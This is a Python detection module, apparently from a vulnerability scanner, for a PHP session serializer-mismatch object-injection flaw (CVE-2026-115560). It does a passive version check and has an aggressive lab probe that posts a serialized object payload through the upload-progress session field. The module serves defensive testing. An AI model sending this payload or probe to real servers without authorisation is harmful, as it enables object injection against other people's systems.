from __future__ import annotations

import re
from typing import Any

from ...core.categories import VulnerabilityType
from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Confidence, Finding, Status
from ...core.transcript import attach_transcript
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2026-115560"
NAME = "PHP session serializer mismatch via upload progress"
RULE = (
    "PHP <8.2.36, 8.3.* <8.3.37, 8.4.* <8.4.28, 8.5.* <8.5.13 "
    "(session.upload_progress.enabled=1 with mixed session serializers)"
)
TYPE = VulnerabilityType.OBJECT_INJECTION
HAS_EXPLOIT = True
EXPLOIT_MODES = ["aggressive"]

FIXED_BY_BRANCH = {
    "8.2": "8.2.36",
    "8.3": "8.3.37",
    "8.4": "8.4.28",
    "8.5": "8.5.13",
}
LEGACY_BRANCHES = {"7.4", "8.0", "8.1"}
POWERED_BY_RE = re.compile(r"PHP/([0-9]+(?:\.[0-9]+)+)", re.IGNORECASE)
PAYLOAD = '|O:6:"Gadget":0:{}'
COOKIE = {"Cookie": "PHPSESSID=lab115560"}


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.DETECTED_VERSION_UNKNOWN
    branch = f"{parsed.major}.{parsed.minor}"
    fixed = FIXED_BY_BRANCH.get(branch)
    if fixed:
        return Status.LIKELY_VULNERABLE if parsed < parse_version_required(fixed) else Status.PATCHED
    if branch in LEGACY_BRANCHES or parsed.major < 8 or (parsed.major == 8 and parsed.minor < 2):
        return Status.NOT_CONFIRMED
    return Status.NOT_AFFECTED


def _powered_by(response: dict[str, Any]) -> str | None:
    headers = response.get("headers") or {}
    values: list[str] = []
    if isinstance(headers, dict):
        for key, value in headers.items():
            if str(key).lower() == "x-powered-by":
                values.extend(value if isinstance(value, list) else [str(value)])
    for value in values:
        match = POWERED_BY_RE.search(value)
        if match:
            return match.group(1)
    return None


def passive_result(php_runtime: dict[str, Any] | None) -> Finding:
    runtime = php_runtime or {}
    version = runtime.get("version")
    if not runtime.get("detected"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_DETECTED,
            confidence=Confidence.LOW,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            detail="PHP was not fingerprinted from public HTTP responses.",
            action=(
                "Upgrade to 8.2.36, 8.3.37, 8.4.28, or 8.5.13; as a temporary "
                "measure disable session.upload_progress.enabled and keep the same "
                "session.serialize_handler across applications sharing a session store."
            ),
            vulnerability_type=TYPE,
        )

    status = classify_version(version)
    if status == Status.LIKELY_VULNERABLE:
        detail = (
            f"Detected PHP {version}; the version is in the advisory range. The "
            "demonstrated path needs session.upload_progress.enabled=1, a writer "
            "using php_serialize or php_binary, a later reader using the php "
            "serializer, and a deserialization gadget chain in the reading "
            "application. PHP 8.5.13 disables upload progress by default and "
            "rejects runtime changes to session INI settings while it is on."
        )
        confidence = Confidence.MEDIUM
    elif status == Status.PATCHED:
        detail = f"Detected PHP {version}, which is at or beyond the branch-specific fixed release."
        confidence = Confidence.HIGH
    elif status == Status.NOT_CONFIRMED:
        detail = (
            f"Detected PHP {version} on an EOL branch without an upstream fixed release. "
            "The effective status depends on the distributor package and the effective "
            "upload-progress/serializer configuration."
        )
        confidence = Confidence.MEDIUM
    else:
        detail = (
            f"Detected PHP {version}; the advisory's affected ranges do not include this branch."
        )
        confidence = Confidence.HIGH

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component="PHP runtime",
        component_version=version,
        affected_rule=RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action=(
            "Upgrade to 8.2.36, 8.3.37, 8.4.28, or 8.5.13; as a temporary measure "
            "disable session.upload_progress.enabled and keep the same "
            "session.serialize_handler across applications sharing a session store."
        ),
        evidence={
            "source": runtime.get("source"),
            "server": runtime.get("server"),
            "active_probe": "not_sent",
            "upload_progress_default": "on before 8.5.13, off in 8.5.13",
            "package_backport_required": status == Status.NOT_CONFIRMED,
        },
        vulnerability_type=TYPE,
    )


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Write the upload-progress key with php_serialize and read it with php.

    The write endpoint uses the default session.upload_progress.enabled value
    (on in 8.5.12, off in 8.5.13) and php_serialize. The read endpoint uses
    the php serializer and defines a Gadget whose __wakeup writes a marker.
    A fired gadget is the object-injection proof; the fixed build returns
    GADGET_NOT_FIRED.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)

    write = client.post_multipart(
        f"{base}/write.php",
        fields={"PHP_SESSION_UPLOAD_PROGRESS": PAYLOAD},
        files={"f": ("proofcms.txt", b"proofcms", "text/plain")},
        headers=COOKIE,
        timeout=max(timeout, 30),
    )
    write_status = int(write.get("status", 0) or 0)
    write_body = str(write.get("body", ""))
    if is_transport_error(write) or write_status != 200 or "WRITE_OK" not in write_body:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The lab write endpoint /write.php did not answer with WRITE_OK. "
                "The serializer-mismatch proof needs the labs/cve-2026-115560 app; "
                "no read request was sent."
            ),
            action="Serve the labs/cve-2026-115560 app and retry in an isolated lab.",
            evidence={
                "write_status": write_status,
                "write_transport_error": is_transport_error(write),
            },
            vulnerability_type=TYPE,
        )

    read = client.get(f"{base}/read.php", headers=COOKIE, timeout=max(timeout, 30))
    read_status = int(read.get("status", 0) or 0)
    read_body = str(read.get("body", ""))
    fired = "GADGET_FIRED" in read_body
    not_fired = "GADGET_NOT_FIRED" in read_body
    lab_php = _powered_by(read) or _powered_by(write)

    evidence = attach_transcript(
        {
            "write_endpoint": "/write.php",
            "read_endpoint": "/read.php",
            "lab_php": lab_php,
            "write_status": write_status,
            "read_status": read_status,
            "gadget_fired": fired,
            "gadget_not_fired": not_fired,
            "read_transport_error": is_transport_error(read),
        },
        client,
    )

    if is_transport_error(read):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.ERROR,
            confidence=Confidence.LOW,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/read.php",
            detail=f"The read request failed in transit ({transport_error_detail(read)}).",
            action="Restart the lab stack and retry; confirm /write.php answers 200 first.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if fired:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/read.php",
            detail=(
                "The upload-progress key written with php_serialize was read with "
                "the php serializer and the Gadget __wakeup fired. Fixed builds "
                "disable upload progress by default and return GADGET_NOT_FIRED. "
                "This confirms CVE-2026-115560 without executing application code."
            ),
            action=(
                "Upgrade to 8.2.36, 8.3.37, 8.4.28, or 8.5.13; as a temporary measure "
                "disable session.upload_progress.enabled and keep the same "
                "session.serialize_handler across applications sharing a session store."
            ),
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    if not_fired:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.HIGH,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/read.php",
            detail=(
                "The read endpoint returned GADGET_NOT_FIRED. That is the fixed-build "
                "behavior: upload progress is disabled by default, so the crafted key "
                "never reaches the php serializer."
            ),
            action="No action required if the runtime is at or beyond the branch-specific fixed release.",
            evidence=evidence,
            vulnerability_type=TYPE,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="PHP runtime",
        affected_rule=RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=f"{base}/read.php",
        detail=(
            f"The read endpoint returned HTTP {read_status} without either gadget marker; "
            "the lab serializer geometry may differ from the expected path."
        ),
        action="Confirm the write endpoint uses php_serialize and the read endpoint uses php.",
        evidence=evidence,
        vulnerability_type=TYPE,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    php_runtime: dict[str, Any] | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    del cms_version, aggressive_command, aggressive_args, kwargs
    passive = passive_result(php_runtime)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += (
            " This CVE needs the lab-only upload-progress/serializer differential "
            "(aggressive mode)."
        )
        return passive
    if passive.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
        passive.detail += " Aggressive proof skipped because the PHP version was not potentially affected."
        return passive
    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "php",
        "name": NAME,
        "component": "PHP runtime",
        "affected_rule": RULE,
        "affected_versions": [
            "<8.2.36",
            ">=8.3.0,<8.3.37",
            ">=8.4.0,<8.4.28",
            ">=8.5.0,<8.5.13",
        ],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": True,
        "vulnerability_type": TYPE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-115560",
            "https://github.com/php/php-src/commit/548bd27949b00bfe01ff38d692dae99cf904b281",
            "https://www.php.net/",
        ],
    }
